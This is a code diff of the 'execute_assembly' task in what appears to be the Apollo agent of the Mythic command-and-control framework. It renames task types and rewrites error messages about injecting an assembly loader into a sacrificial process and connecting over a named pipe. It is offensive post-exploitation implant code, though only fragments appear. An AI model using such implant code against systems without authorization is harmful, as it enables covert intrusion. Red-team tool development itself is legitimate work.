@@ -7,7 +7,6 @@
 #if EXECUTE_ASSEMBLY
 
 using System;
-using System.Collections.Generic;
 using System.Linq;
 using System.Text;
 using ApolloInterop.Classes;
@@ -16,7 +15,6 @@ using ApolloInterop.Structs.MythicStructs;
 using System.Runtime.Serialization;
 using ApolloInterop.Serializers;
 using System.Threading;
-using System.IO;
 using System.Collections.Concurrent;
 using System.IO.Pipes;
 using ApolloInterop.Structs.ApolloStructs;
@@ -49,7 +47,7 @@ namespace Tasks
         private Action<object> _flushMessages;
         private ThreadSafeList<string> _assemblyOutput = new ThreadSafeList<string>();
         private bool _completed = false;
-        public execute_assembly(IAgent agent, Task task) : base(agent, task)
+        public execute_assembly(IAgent agent, MythicTask mythicTask) : base(agent, mythicTask)
         {
             _sendAction = (object p) =>
             {
@@ -111,7 +109,7 @@ namespace Tasks
 
         public override void Start()
         {
-            TaskResponse resp;
+            MythicTaskResponse resp;
             Process proc = null;
             try
             {
@@ -185,15 +183,12 @@ namespace Tasks
                                     }
                                     else
                                     {
-                                        resp = CreateTaskResponse($"Failed to connect to named pipe.", true, "error");
+                                        resp = CreateTaskResponse($"Injected assembly into sacrificial process: {info.Application}.\n Failed to connect to named pipe.", true, "error");
                                     }
                                 }
                                 else
                                 {
-                                    resp = CreateTaskResponse(
-                                        $"Failed to inject assembly loader into sacrificial process.",
-                                        true,
-                                        "error");
+                                    resp = CreateTaskResponse($"Failed to inject assembly loader into sacrificial process {info.Application}.", true, "error");
                                 }
                             }
                             else
@@ -203,15 +198,12 @@ namespace Tasks
                         }
                         else
                         {
-                            resp = CreateTaskResponse(
-                                $"Failed to download assembly loader stub (with id: {parameters.LoaderStubId})",
-                                true,
-                                "error");
+                            resp = CreateTaskResponse($"Failed to download assembly loader stub (with id: {parameters.LoaderStubId})", true, "error");
                         }
                     }
                     else
                     {
-                        resp = CreateTaskResponse($"{parameters.AssemblyName} is not loaded (have you registered it?)", true);
+                        resp = CreateTaskResponse($"{parameters.AssemblyName} is not loaded (have you registered it?)", true, "error");
                     }
                 }
             }
